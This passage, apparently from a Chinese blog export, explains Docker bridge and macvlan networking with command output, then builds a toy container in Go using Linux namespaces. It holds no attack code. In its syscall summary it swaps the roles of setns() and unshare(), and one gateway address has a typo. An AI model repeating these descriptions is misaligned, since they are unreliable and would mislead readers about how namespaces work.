server启动时，会在主机上创建一个名为docker0的虚拟网桥，此主机上启动的Docker容器会连接到这个虚拟网桥上。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。接下来就要为容器分配IP了，Docker会从RFC1918所定义的私有IP网段中，选择一个和宿主机不同的IP地址和子网分配给docker0，连接到docker0的容器就从这个子网中选择一个未占用的IP使用。如一般Docker会使用172.17.0.0/16这个网段，并将172.17.0.1/16分配给docker0网桥（在主机上使用ifconfig命令是可以看到docker0的，可以认为它是网桥的管理接口，在宿主机上作为一块虚拟网卡使用）。单机环境下的网络拓扑如下，主机地址为10.10.0.186/24。 3.2 Docker：网络模式详解 Docker完成以上网络配置的过程大致是这样的： 在主机上创建一对虚拟网卡veth pair设备。veth设备总是成对出现的，它们组成了一个数据的通道，数据从一个设备进入，就会从另一个设备出来。因此，veth设备常用来连接两个网络设备。 Docker将veth pair设备的一端放在新创建的容器中，并命名为eth0。另一端放在主机中，以veth65f9这样类似的名字命名，并将这个网络设备加入到docker0网桥中，可以通过brctl show命令查看。 123$ brctl showbridge name bridge id STP enabled interfacesdocker0 8000.02425f21c208 no 从docker0子网中分配一个IP给容器使用，并设置docker0的IP地址为容器的默认网关。 123456789101112131415161718192021222324252627# 运行容器;$ docker run --name=nginx_bridge --net=bridge -p 80:80 -d nginx 9582dbec7981085ab1f159edcc4bf35e2ee8d5a03984d214bce32a30eab4921a # 查看容器;$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9582dbec7981 nginx &quot;nginx -g &#x27;daemon ...&quot; 3 seconds ago Up 2 seconds 0.0.0.0:80-&gt;80/tcp nginx_bridge # 查看容器网络;$ docker inspect 9582dbec7981&quot;Networks&quot;: &#123; &quot;bridge&quot;: &#123; &quot;IPAMConfig&quot;: null, &quot;Links&quot;: null, &quot;Aliases&quot;: null, &quot;NetworkID&quot;: &quot;9e017f5d4724039f24acc8aec634c8d2af3a9024f67585fce0a0d2b3cb470059&quot;, &quot;EndpointID&quot;: &quot;81b94c1b57de26f9c6690942cd78689041d6c27a564e079d7b1f603ecc104b3b&quot;, &quot;Gateway&quot;: &quot;172.17.0.1&quot;, &quot;IPAddress&quot;: &quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041$ docker network inspect bridge[ &#123; &quot;Name&quot;: &quot;bridge&quot;, &quot;Id&quot;: &quot;9e017f5d4724039f24acc8aec634c8d2af3a9024f67585fce0a0d2b3cb470059&quot;, &quot;Created&quot;: &quot;2017-08-09T23:20:28.061678042-04:00&quot;, &quot;Scope&quot;: &quot;local&quot;, &quot;Driver&quot;: &quot;bridge&quot;, &quot;EnableIPv6&quot;: false, &quot;IPAM&quot;: &#123; &quot;Driver&quot;: &quot;default&quot;, &quot;Options&quot;: null, &quot;Config&quot;: [ &#123; &quot;Subnet&quot;: &quot;172.17.0.0/16&quot; &#125; ] &#125;, &quot;Internal&quot;: false, &quot;Attachable&quot;: false, &quot;Ingress&quot;: false, &quot;Containers&quot;: &#123; &quot;9582dbec7981085ab1f159edcc4bf35e2ee8d5a03984d214bce32a30eab4921a&quot;: &#123; &quot;Name&quot;: &quot;nginx_bridge&quot;, &quot;EndpointID&quot;: &quot;81b94c1b57de26f9c6690942cd78689041d6c27a564e079d7b1f603ecc104b3b&quot;, &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;, &quot;IPv4Address&quot;: &quot;172.17.0.2/16&quot;, &quot;IPv6Address&quot;: &quot;&quot; &#125; &#125;, &quot;Options&quot;: &#123; &quot;com.docker.network.bridge.default_bridge&quot;: &quot;true&quot;, &quot;com.docker.network.bridge.enable_icc&quot;: &quot;true&quot;, &quot;com.docker.network.bridge.enable_ip_masquerade&quot;: &quot;true&quot;, &quot;com.docker.network.bridge.host_binding_ipv4&quot;: &quot;0.0.0.0&quot;, &quot;com.docker.network.bridge.name&quot;: &quot;docker0&quot;, &quot;com.docker.network.driver.mtu&quot;: &quot;1500&quot; &#125;, &quot;Labels&quot;: &#123;&#125; &#125;] 网络拓扑介绍完后，接着介绍一下bridge模式下容器是如何通信的。 3.3 bridge模式下容器的通信 在bridge模式下，连在同一网桥上的容器可以相互通信（若出于安全考虑，也可以禁止它们之间通信，方法是在DOCKER_OPTS变量中设置–icc=false，这样只有使用–link才能使两个容器通信）。 Docker可以开启容器间通信（意味着默认配置–icc=true），也就是说，宿主机上的所有容器可以不受任何限制地相互通信，这可能导致拒绝服务攻击。进一步地，Docker可以通过–ip_forward和–iptables两个选项控制容器间、容器和外部世界的通信。 容器也可以与外部通信，我们看一下主机上的Iptable规则，可以看到这么一条 1-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE 这条规则会将源地址为172.17.0.0/16的包（也就是从Docker容器产生的包），并且不是从docker0网卡发出的，进行源地址转换，转换成主机网卡的地址。这么说可能不太好理解，举一个例子说明一下。假设主机有一块网卡为eth0，IP地址为10.10.101.105/24，网关为10.10.101.254。从主机上一个IP为172.17.0.1/16的容器中ping百度（180.76.3.151）。IP包首先从容器发往自己的默认网关docker0，包到达docker0后，也就到达了主机上。然后会查询主机的路由表，发现包应该从主机的eth0发往主机的网关10.10.105.254/24。接着包会转发给eth0，并从eth0发出去（主机的ip_forward转发应该已经打开）。这时候，上面的Iptable规则就会起作用，对包做SNAT转换，将源地址换为eth0的地址。这样，在外界看来，这个包就是从10.10.101.105上发出来的，Docker容器对外是不可见的。 那么，外面的机器是如何访问Docker容器的服务呢？我们首先用下面命令创建一个含有web应用的容器，将容器的80端口映射到主机的80端口。 1$ docker run --name=nginx_bridge --net=bridge -p 80:80 -d nginx 然后查看Iptable规则的变化，发现多了这样一条规则： 1-A DOCKER ! -i docker0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 172.17.0.2:80 此条规则就是对主机eth0收到的目的端口为80的tcp流量进行DNAT转换，将流量发往172.17.0.2:80，也就是我们上面创建的Docker容器。所以，外界只需访问10.10.101.105:80就可以访问到容器中的服务。 除此之外，我们还可以自定义Docker使用的IP地址、DNS等信息，甚至使用自己定义的网桥，但是其工作方式还是一样的。 自定义网络 建议使用自定义的网桥来控制哪些容器可以相互通信，还可以自动DNS解析容器名称到IP地址。Docker提供了创建这些网络的默认网络驱动程序，你可以创建一个新的Bridge网络，Overlay或Macvlan网络。你还可以创建一个网络插件或远程网络进行完整的自定义和控制。 你可以根据需要创建任意数量的网络，并且可以在任何给定时间将容器连接到这些网络中的零个或多个网络。此外，您可以连接并断开网络中的运行容器，而无需重新启动容器。当容器连接到多个网络时，其外部连接通过第一个非内部网络以词法顺序提供。 接下来介绍Docker的内置网络驱动程序。 4.1 bridge 一个bridge网络是Docker中最常用的网络类型。桥接网络类似于默认bridge网络，但添加一些新功能并删除一些旧的能力。以下示例创建一些桥接网络，并对这些网络上的容器执行一些实验。 1$ docker network create --driver bridge new_bridge 创建网络后，可以看到新增加了一个网桥（172.18.0.1）。 1234567891011121314151617$ ifconfigbr-f677ada3003c: flags=4099&lt;UP,BROADCAST,MULTICAST&gt; mtu 1500 inet 172.18.0.1 netmask 255.255.0.0 broadcast 0.0.0.0 ether 02:42:2f:c1:db:5a txqueuelen 0 (Ethernet) RX packets 4001976 bytes 526995216 (502.5 MiB) RX errors 0 dropped 35 overruns 0 frame 0 TX packets 1424063 bytes 186928741 (178.2 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 0.0.0.0 inet6 fe80::42:5fff:fe21:c208 prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:5f:21:c2:08 txqueuelen 0 (Ethernet) RX packets 12 bytes 2132 (2.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 24 bytes 2633 (2.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 4.2 Macvlan Macvlan是一个新的尝试，是真正的网络虚拟化技术的转折点。Linux实现非常轻量级，因为与传统的Linux Bridge隔离相比，它们只是简单地与一个Linux以太网接口或子接口相关联，以实现网络之间的分离和与物理网络的连接。 Macvlan提供了许多独特的功能，并有充足的空间进一步创新与各种模式。这些方法的两个高级优点是绕过Linux网桥的正面性能以及移动部件少的简单性。删除传统上驻留在Docker主机NIC和容器接口之间的网桥留下了一个非常简单的设置，包括容器接口，直接连接到Docker主机接口。由于在这些情况下没有端口映射，因此可以轻松访问外部服务。 4.2.1 Macvlan Bridge模式示例用法 Macvlan Bridge模式每个容器都有唯一的MAC地址，用于跟踪Docker主机的MAC到端口映射。 Macvlan驱动程序网络连接到父Docker主机接口。示例是物理接口，例如eth0，用于802.1q VLAN标记的子接口eth0.10（.10代表VLAN 10）或甚至绑定的主机适配器，将两个以太网接口捆绑为单个逻辑接口。 指定的网关由网络基础设施提供的主机外部。 每个Macvlan Bridge模式的Docker网络彼此隔离，一次只能有一个网络连接到父节点。每个主机适配器有一个理论限制，每个主机适配器可以连接一个Docker网络。 同一子网内的任何容器都可以与没有网关的同一网络中的任何其他容器进行通信macvlan bridge。 相同的docker network命令适用于vlan驱动程序。 在Macvlan模式下，在两个网络/子网之间没有外部进程路由的情况下，单独网络上的容器无法互相访问。这也适用于同一码头网络内的多个子网。 在以下示例中，eth0在docker主机网络上具有IP地址172.16.86.0/24，默认网关为172.16.86.1，网关地址为外部路由器172.16.86.1。 注意对于Macvlan桥接模式，子网值需要与Docker主机的NIC的接口相匹配。例如，使用由该-o parent=选项指定的Docker主机以太网接口的相同子网和网关。 此示例中使用的父接口位于eth0子网上172.16.86.0/24，这些容器中的容器docker network也需要和父级同一个子网-o parent=。网关是网络上的外部路由器，不是任何ip伪装或任何其他本地代理。 驱动程序用-d driver_name选项指定，在这种情况下-d macvlan。 父节点-o parent=eth0配置如下： 123$ ip addr show eth03: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 inet 172.16.86.250/24 brd 172.16.86.255 scope global eth0 创建macvlan网络并运行附加的几个容器： 123456789101112# Macvlan (-o macvlan_mode= Defaults to Bridge mode if not specified)docker network create -d macvlan \\ --subnet=172.16.86.0/24 \\ --gateway=172.16.86.1 \\ -o parent=eth0 pub_net # Run a container on the new network specifying the --ip address.docker run --net=pub_net --ip=172.16.86.10 -itd alpine /bin/sh # Start a second container and ping the firstdocker run --net=pub_net -it --rm alpine /bin/shping -c 4 172.16.86.10 看看容器ip和路由表： 123456789101112ip a show eth0 eth0@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 46:b2:6b:26:2f:69 brd ff:ff:ff:ff:ff:ff inet 172.16.86.2/24 scope global eth0 ip route default via 172.16.86.1 dev eth0 172.16.86.0/24 dev eth0 src 172.16.86.2 # NOTE: the containers can NOT ping the underlying host interfaces as# they are intentionally filtered by Linux for additional isolation.# In this case the containers cannot ping the -o parent=172.16.86.250 4.2.2 Macvlan 802.1q Trunk Bridge模式示例用法 VLAN（虚拟局域网）长期以来一直是虚拟化数据中心网络的主要手段，目前仍在几乎所有现有的网络中隔离广播的主要手段。 常用的VLAN划分方式是通过端口进行划分，尽管这种划分VLAN的方式设置比较很简单，但仅适用于终端设备物理位置比较固定的组网环境。随着移动办公的普及，终端设备可能不再通过固定端口接入交换机，这就会增加网络管理的工作量。比如，一个用户可能本次接入交换机的端口1，而下一次接入交换机的端口2，由于端口1和端口2属于不同的VLAN，若用户想要接入原来的VLAN中，网管就必须重新对交换机进行配置。显然，这种划分方式不适合那些需要频繁改变拓扑结构的网络。而MAC VLAN可以有效解决这个问题，它根据终端设备的MAC地址来划分VLAN。这样，即使用户改变了接入端口，也仍然处在原VLAN中。 Mac vlan不是以交换机端口来划分vlan。因此，一个交换机端口可以接受来自多个mac地址的数据。一个交换机端口要处理多个vlan的数据，则要设置trunk模式。 在主机上同时运行多个虚拟网络的要求是非常常见的。Linux网络长期以来一直支持VLAN标记，也称为标准802.1q，用于维护网络之间的数据路由隔离。连接到Docker主机的以太网链路可以配置为支持802.1q VLAN ID，方法是创建Linux子接口，每个子接口专用于唯一的VLAN ID。 创建Macvlan网络 VLAN ID 10 12345$ docker network create \\ --driver macvlan \\ --subnet=10.10.0.0/24 \\ --gateway=10.10.0.253 \\ -o parent=eth0.10 macvlan10 开启一个桥接Macvlan的容器： 12345678910$ docker run --net=macvlan10 -it --name macvlan_test1 --rm alpine /bin/sh/ # ip addr show1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever21: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 02:42:0a:0a:00:01 brd ff:ff:ff:ff:ff:ff inet 10.10.0.1/24 scope global eth0 valid_lft forever preferred_lft forever 可以看到分配了一个10.10.0.1的地址，然后看一下路由地址。 123# ip routedefault via 10.10.0.253 dev eth010.10.0.0/24 dev eth0 src 10.10.0.1 然后再开启一个桥接Macvlan的容器： 12345678910$ docker run --net=macvlan10 -it --name macvlan_test2 --rm alpine /bin/sh/ # ip addr show1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever22: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 02:42:0a:0a:00:02 brd ff:ff:ff:ff:ff:ff inet 10.10.0.2/24 scope global eth0 valid_lft forever preferred_lft forever 可以看到分配了一个10.10.0.2的地址，然后可以在两个容器之间相互ping，是可以ping通的。 1234# ping 10.10.0.1PING 10.10.0.1 (10.10.0.1): 56 data bytes64 bytes from 10.10.0.1: seq=0 ttl=64 time=0.094 ms64 bytes from 10.10.0.1: seq=1 ttl=64 time=0.057 ms 经过上面两个容器的创建可以看出，容器IP是根据创建网络时的网段从小往大分配的。 当然，在创建容器时，我们也可以使用–ip手动执行一个IP地址分配给容器，如下操作。 123456$ docker run --net=macvlan10 -it --name macvlan_test3 --ip=10.10.0.189 --rm alpine /bin/sh/ # ip addr show eth024: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 02:42:0a:0a:00:bd brd ff:ff:ff:ff:ff:ff inet 10.10.0.189/24 scope global eth0 valid_lft forever preferred_lft forever VLAN ID 20 接着可以创建由Docker主机标记和隔离的第二个VLAN网络，该macvlan_mode默认是macvlan_mode=bridge，如下： 123456$ docker network create \\ --driver macvlan \\ --subnet=192.10.0.0/24 \\ --gateway=192.10.0.253 \\ -o parent=eth0.20 \\ -o macvlan_mode=bridge macvlan20 当我们创建完Macvlan网络之后，在docker主机可以看到相关的子接口，如下： 1234567891011121314$ ifconfigeth0.10: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 ether 00:0c:29:16:01:8b txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 18 bytes 804 (804.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth0.20: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 ether 00:0c:29:16:01:8b txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 在/proc/net/vlan/config文件中，还可以看见相关的Vlan信息，如下： 12345$ cat /proc/net/vlan/configVLAN Dev name | VLAN IDName-Type: VLAN_NAME_TYPE_RAW_PLUS_VID_NO_PADeth0.10 | 10 | eth0eth0.20 | 20 | eth0"},{"title":"Linux Namespace与Docker原理","date":"2021-02-01","updated":"2024-03-19","path":"2021/02/01/Linux-Namespace与Docker原理/","text":"namespace 初识 Docker 是一个基于 namespace、cgroup、Union FS 等等技术的一个开源容器引擎，很多人都会觉得 Docker 是个新兴技术，其实不然，其主要隔离技术 Namespace 技术早在 Linux 内核版本为 2.6 时候就差不多完成了（像 Ubuntu 16.04 发行版本的内核基本上都是 4.4，CentOS 7 则普遍 3.10 ）。 Linux Namespace 是 Linux 提供的一种内核级别环境隔离的方法。 要想实现隔离的效果，需要完成的东西又有哪些呢？其实如果你安装了 gcc 工具链（安装 golang 之后就会有了），那么使用 man namespaces 命令就可以了解到 namespace 技术的大概，也可查看在线手册。 这里简单地搬运了些知识点，首先是 Linux 提供的具体的隔离内容： Namespace 系统调用参数 内核版本 隔离内容 UTS (Unix Time-sharing System) CLONE_NEWUTS Linux 2.4.19 主机名与域名 IPC (Inter-Process Communication) CLONE_NEWIPC Linux 2.6.19 信号量、消息队列和共享内存 PID (Process ID) CLONE_NEWPID Linux 2.6.19 进程编号 Network CLONE_NEWNET Linux 2.6.24 网络设备、网络栈、端口等等 Mount CLONE_NEWNS Linux 2.6.29 挂载点（文件系统） User CLONE_NEWUSER Linux 3.8 用户和用户组 还设计到三个系统调用(system call)的 API： clone()：用来创建新进程，与 fork 创建新进程不同的是，clone 创建进程时候运行传递如 CLONE_NEW* 的 namespace 隔离参数，来控制子进程所共享的内容，更多内容请查看clone 手册 setns()：让某个进程脱离某个 namespace unshare()：让某个进程加入某个 namespace 之中 查看进程 namespace /proc/[pid]/ns/ 目录下包含了某个进程的 namespace 所属，在 shell 中 $$ 为当前进程 PID 所以可以： 1234567891011121314$ ls -l /proc/$$/nstotal 0lrwxrwxrwx 1 root root 0 Jan 5 00:13 cgroup -&gt; cgroup:[4026531835]lrwxrwxrwx 1 root root 0 Jan 4 06:18 ipc -&gt; ipc:[4026531839]lrwxrwxrwx 1 root root 0 Jan 4 06:18 mnt -&gt; mnt:[4026531840]lrwxrwxrwx 1 root root 0 Jan 4 06:18 net -&gt; net:[4026531957]lrwxrwxrwx 1 root root 0 Jan 4 06:18 pid -&gt; pid:[4026531836]lrwxrwxrwx 1 root root 0 Jan 4 06:18 user -&gt; user:[4026531837]lrwxrwxrwx 1 root root 0 Jan 4 06:18 uts -&gt; uts:[4026531838]$ readlink /proc/$$/ns/utsuts:[4026531838]$ readlink /proc/$PPID/ns/utsuts:[4026531838] /proc/[pid]/mounts 目录展现了进程的挂载点，而 /proc/[pid]/mountinfo 里的内容更详细。 Linux 系统调用 操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间。 系统调用，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态运行。如设备IO操作或者进程间通信。 也就是说，如果自己程序生成的可执行文件，除了一些简单的变量加来加去之外，大多数有意思的功能都是通过系统调用来完成的，平时没有感知到，是因为库函数、动态链接库封装屏蔽了这些。 程序设计中没有什么是加一层解决不了的，如果有那就再加一层。所以 syscall 可以作为一个兼容层、移植层，可以通过实现一组 syscall 接口，用来来模拟 Linux。 Linux 中提供了两个工具： starce 和 ptrace 用来调试监控某个进程的系统调用。 Linux 进程 Linux 下可以通过 ps -ef 命令打印出当前操作系统中正在执行的进程，其实还有一个更有意思的命令 pstree ，这个命令会以树的形式输出当前的进程。 为什么这些进程会形成一个树的形状？这是因为在 Linux 内核启动之后只会有一个 pid 为 0 的 运行在内核态的 idle 进程，随后在系统启动过程中，会通过该进程 fork 出 PID 为 1 的 init 进程和 PID 为 2 的 kthreadd 进程。 init 进程负责初始化系统，并最后运行在用户空间。在系统启动完成完成后，init将变为守护进程监视系统其他进程。init 有不同实现，如最初的 init 到 System V 再到 Systemd，常用的 service 命令就是最初由 init 实现的，用来管理各种服务的守护进程，关于 init 的演进可以参考 linux 系统管理程序。 kthreadd 内核线程都是直接或者间接的以 kthreadd 为父进程，该进程负责管理和调度其他的内核进程。 在 ps -ef 命令下可以看到这些进程， pstree 可以看到用户进程，还有一个知识点就是用户空间的进程 PID 都是大于 1000 的。 Uinx 的哲学中接口的设计都是高度正交的，通过 fork 和 exec系列的组合就可以完成多进程的操作。 fork() 默认会进程复制当前进程自身（代码段、数据段、环境变量等等）来快速创建子进程，子进程会从调用 fork() 的地方开始执行，也就是在代码的 fork() 处进行了分叉。fork() 返回值在父进程中为创建的子进程的 PID，在子进程返回 0 ，出现错误返回负值，可以通过返回值来进行区别操作（如父进程里 wait 子进程）。 exec 系列 会用一个新的程序来替换现在的整个进程，其会将程序整个加载到现在的进程中，然后从头开始运行，如更新了 bash 的某些配置之后可以用 exec bash 命令来利用新 bash 线程替换掉当前的进程。 此外还有两个有名的进程： 孤儿进程：个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被 init 进程(进程号为1)所收养，并由 init 进程对它们完成状态收集工作。 僵尸进程：一个进程使用 fork 创建子进程，如果子进程退出，而父进程并没有调用 wait 或 waitpid 获取（处理）子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程，在 top 命令里是可以看到。 所以通过一顿高度正交的 fork exec 操作，会形成一颗进程树，这里可以通过 pstree 演示下： 123456789$ pstree -pa $$zsh,1680 └─pstree,130454 -pa 1680$ sleep 10s &amp;[1] 130554$ pstree -pa $$zsh,1680 ├─pstree,130562 -pa 1680 └─sleep,130554 10s 其实在执行 pstree -pa $$ 就可以看到他是基于当前终端的子进程。 namespace 实践 为了最好的体验还是在 Linux 内核 3.8 以上的系统上进行（这里使用的 Ubuntu server 16.04, Linux 4.4）。为什么不用 docker for windows 或者 docker for mac 呢？因为这两个其实还是是在 linux 虚拟机上运行 docker 的，docker for windows 需要将 linux 虚拟机装在开启 hyper-v 的 win10 专业版上，而 docker for mac 使用通过 HyperKit 运行 linux 虚拟机。为了方便，使用 golang 来演示循序渐进的达到 Docker 的体验。 docker 是虚拟机吗 由前面的 namespace 的知识可以知道 Docker 是比虚拟机的虚拟化程度更弱、效率更高的线程级别的隔离，下面的示例可以验证这一点。 123456789101112131415$ docker run alpine sleep 1m &amp;$ pstree -pa $$zsh,1680 ├─docker,7314 run alpine sleep 1m │ ├─&#123;docker&#125;,7315 │ ├─&#123;docker&#125;,7316 │ ├─&#123;docker&#125;,7317 │ ├─&#123;docker&#125;,7318 │ ├─&#123;docker&#125;,7321 │ ├─&#123;docker&#125;,7324 │ └─&#123;docker&#125;,7325 └─pstree,7431 -pa 1680$ ps -ef |grep &quot;sleep 1m&quot;creaink 7314 1680 0 03:56 pts/1 00:00:00 docker run alpine sleep 1mroot 7362 7344 0 03:56 ? 00:00:00 sleep 1m 上面的例子使用 alpine 镜像运行了 sleep 1m 这个命令即休眠一分钟，直接使用 pstree 可以证实最后其虚拟化程度也就是线程级别的。后面的 ps 命令揭示的是其实这里有两个命令运行着 sleep 1m，这是因为 docker 分为 docker daemon 和 docker client，docker(docker client) 命令通过 REST API 将用户的命令传递给 dockerd(docker daemon)，也就是最后的实际工作的进程是 dockerd 下的子进程，这就是为什么在终端里运行 docker 运行容器之后，而关闭终端（父进程）容器也不会被终止掉。 版本 zero 先来一个基础的版本，实现一个简单的功能：将传递给程序的命令利用子进程运行： 123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;os/exec&quot; &quot;syscall&quot;)func main() &#123; switch os.Args[1] &#123; case &quot;run&quot;: run() default: fmt.Printf(&quot;do nothing, exit!!!&quot;) &#125;&#125;func run() &#123; fmt.Printf(&quot;running %v\\n&quot;, os.Args[2:]) cmd := exec.Command(os.Args[2], os.Args[3:]...) cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr must(cmd.Run())&#125;func must(err error) &#123; if err != nil &#123; panic(err) &#125;&#125; 命名该程序为 docker-1.go 之后就可以使用 go run docker-1.go run echo hello 来 代理 运行命令一些命令。 甚至可以直接使用 go run docker-1.go run /bin/bash 来将子进程的 shell 衔接到当前终端上，注意 shell prompt 的变化（由 zsh 变为 bash 样式），在下面的例子中将尝试更改 hostname： 1234567891011$ go run docker-0.go run /bin/bashrunning [/bin/bash]creaink@ubuntu:~/share$ hostnameubuntucreaink@ubuntu:~/share$ sudo hostname dockercreaink@ubuntu:~/share$ hostnamedockercreaink@ubuntu:~/share$ exit# 这里的 hostname 也跟着变了$ hostnamedocker 通过最后的命令可以看到 hostname 也跟着变了，这里就没有实现前面提到的 UTS 隔离。 版本 one 增加UTS隔离 可以为 cmd 加上 SysProcAttr，利用 CLONE_NEWUTS 参数来实现其子进程的 UTS 隔离，zero 版本更改的部分如下： 12345678910func run() &#123; // ... cmd.Stderr = os.Stderr cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Cloneflags: syscall.CLONE_NEWUTS, &#125; must(cmd.Run())&#125; 上述更改之后的文件存为 docker-1.go 然后探究： 1234567891011121314$ sudo share go run docker-1.go run /bin/bashrunning [/bin/bash]root@ubuntu:~/share$ readlink /proc/$PPID/ns/utsuts:[4026531838]# 与父进程的 namespace uts 已经不同了root@ubuntu:~/share$ readlink /proc/$$/ns/utsuts:[4026532634]# 更改 hostname 也不会变化了root@ubuntu:~/share$ sudo hostname dockerroot@ubuntu:~/share$ hostnamedockerroot@ubuntu:~/share$ exit$ hostnameubuntu 通过上面的 readlink /proc/[PID]/ns/uts 和 hostname 可以看出来，在新的进程里已经实现了 UTS 的隔离了。那么 CLONE_NEWUTS 这个参数 go 是如何在创建子进程时候传入的呢？答案是利用了 clone 系统调用来完成的，这里可以简单的利用 strace 命令追踪下系统调用: 123456789# go run 系统调用有干扰项，这里编译下$ go build docker-1.go# 这里我们只关心 clone，利用 grep 过滤下$ strace ./docker-1 run echo hi |&amp; grep &quot;clone\\|execv&quot;execve(&quot;./docker-1&quot;, [&quot;./docker-1&quot;, &quot;run&quot;, &quot;echo&quot;, &quot;hi&quot;], [/* 26 vars */]) = 0clone(child_stack=0xc820035fc0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD) = 15932clone(child_stack=0xc820031fc0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD) = 15933clone(child_stack=0xc820033fc0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD) = 15934clone(child_stack=0, flags=CLONE_NEWUTS|SIGCHLD) = -1 EPERM (Operation not permitted) 前面的三个 clone 其实是 go 创建的一些自己的进程（可能用 c 来实现会更干净些），可以在 root 用户下开两个终端一个 strace ./docker-1 run sleep 10s |&amp; grep &quot;clone\\|execv&quot;， 另一个 watch pstree -pa [PID] （这里的 PID 是前面终端的 PID）观察验证。 1234567891011121314151617181920------SHELL1-----$ strace ./docker-1 run sleep 10s |&amp; grep &quot;clone\\|execv&quot;execve(&quot;./docker-1&quot;, [&quot;./docker-1&quot;, &quot;run&quot;, &quot;sleep&quot;, &quot;10s&quot;], 0x7fff73ea0ed8 /* 67 vars */) = 0clone(child_stack=0xc000054000, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM) = 90852clone(child_stack=0xc000056000, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM) = 90853clone(child_stack=NULL, flags=CLONE_VM|CLONE_VFORK|CLONE_NEWUTS|SIGCHLD) = 90856------SHELL2-------Every 2.0s: pstree -pa 88148 zsh,88148 |-grep,91144 --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg ... `-strace,91143 ./docker-1 run sleep 10s `-docker-1,91147 run sleep 10s |-sleep,91152 10s |-&#123;docker-1&#125;,91148 |-&#123;docker-1&#125;,91149 |-&#123;docker-1&#125;,91150 `-&#123;docker-1&#125;,91151 可以看到这三个 clone 的调用采用的是默认的参数：CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD，其含义可在上面提到的 clone 手册 里查阅到。 最后的一个 clone 系统调用参数就很明显的是在程序里自行设定的 CLONE_NEWUTS，SIGCHLD 参数默认要添加上的：共享信号，即子进程的生命周期发生变化时候会通过 SIGCHLD 信号告知父进程。 版本 two 增加PID隔离 这一版本要要在上个版本实现了 UTS 隔离的情况下进而实现 PID 隔离，很容易会想到在调用时候加上 CLONE_NEWPID 即可实现。为了检验，就需要在代理生成的子进程下再生成一个子进程： 12345678910111213141516171819202122232425262728293031323334// 在 main 中加上 child 的 casefunc main() &#123; switch os.Args[1] &#123; // ... case &quot;child&quot;: child() // ... &#125;&#125;// run 修改为下面func run() &#123; cmd := exec.Command(&quot;/proc/self/exe&quot;, append([]string&#123;&quot;child&quot;&#125;, os.Args[2:]...)...) cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID, &#125; must(cmd.Run())&#125;// 加一个函数 childfunc child() &#123; fmt.Printf(&quot;running %v as pid: %d\\n&quot;, 